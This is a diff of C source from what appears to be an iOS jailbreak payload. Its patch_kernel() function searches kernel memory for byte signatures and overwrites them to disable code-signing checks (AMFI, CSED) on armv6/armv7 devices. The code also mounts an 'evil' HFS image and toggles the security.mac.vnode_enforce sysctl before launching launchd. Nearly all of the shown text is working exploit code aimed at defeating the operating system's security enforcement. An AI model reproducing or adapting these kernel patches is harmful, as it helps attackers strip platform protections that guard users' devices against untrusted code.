@@ -54,8 +54,6 @@ void mount_evil_hfs() {
 int patch_kernel(unsigned char* address, unsigned int size) {
 	unsigned int target = 0;
 	/*
-	CSED: 00 00 00 00 01 00 00 00 80 00 00 00 00 00 00 00 => 01 00 00 00 01 00 00 00 80 00 00 00 00 00 00 00 ; armv6 & armv7
-
 	AMFI: 00 B1 00 24 20 46 90 BD  +  0 => 00 B1 01 24 20 46 90 BD ; armv7
 	      00 00 50 E3 00 00 00 0A  00 40 A0 E3 04 00 A0 E1 + 8 => 01 40 A0 E3 ; armv6
 
@@ -86,12 +84,10 @@ int patch_kernel(unsigned char* address, unsigned int size) {
 	unsigned char *paddress = address - 2;
 	
 	IOLog("Entering patch_kernel()\n");
-	
+	 //_memcpy(0x803e304c, "\x00\xB1\x01\x24\x20\x46\x90\xBD", 8);
+
 	for(i = 0; i < size; i+=2) {
 		paddress+=2;
-		//flash_dcache();
-		//flash_icache();
-
 		/*
 		// Patch 1
 		if(mem16eq(paddress, "\x00\x00\x00\x00\x01\x00\x00\x00\x80\x00\x00\x00\x00\x00\x00\x00")) {
@@ -116,7 +112,7 @@ int patch_kernel(unsigned char* address, unsigned int size) {
 			continue;
 		}
 
-		/*
+/*
 		// Patch 3
 		if(mem8eq(paddress, "\x00\x23\x00\x94\x01\x95\x02\x95")) {
 			target = i + 10;
@@ -153,7 +149,7 @@ int patch_kernel(unsigned char* address, unsigned int size) {
 			_memcpy(&address[target], "\x00\x20", 2);
 			continue;
 		}
-		*/
+*/
 
 		// Patch 6
 		if(mem8eq(paddress, "\x00\x28\x40\xF0\xCC\x80\x04\x98")
@@ -230,7 +226,7 @@ int main(int argc, char* argv[]) {
 	mount_evil_hfs();
 
 	// restore vnode_enforce and run launchd
-    sysctlbyname("security.mac.vnode_enforce", NULL, 0, &one, sizeof(one));   
+	sysctlbyname("security.mac.vnode_enforce", NULL, 0, &one, sizeof(one));   
 	execve(execve_params[0], execve_params, execve_env);
 }
 
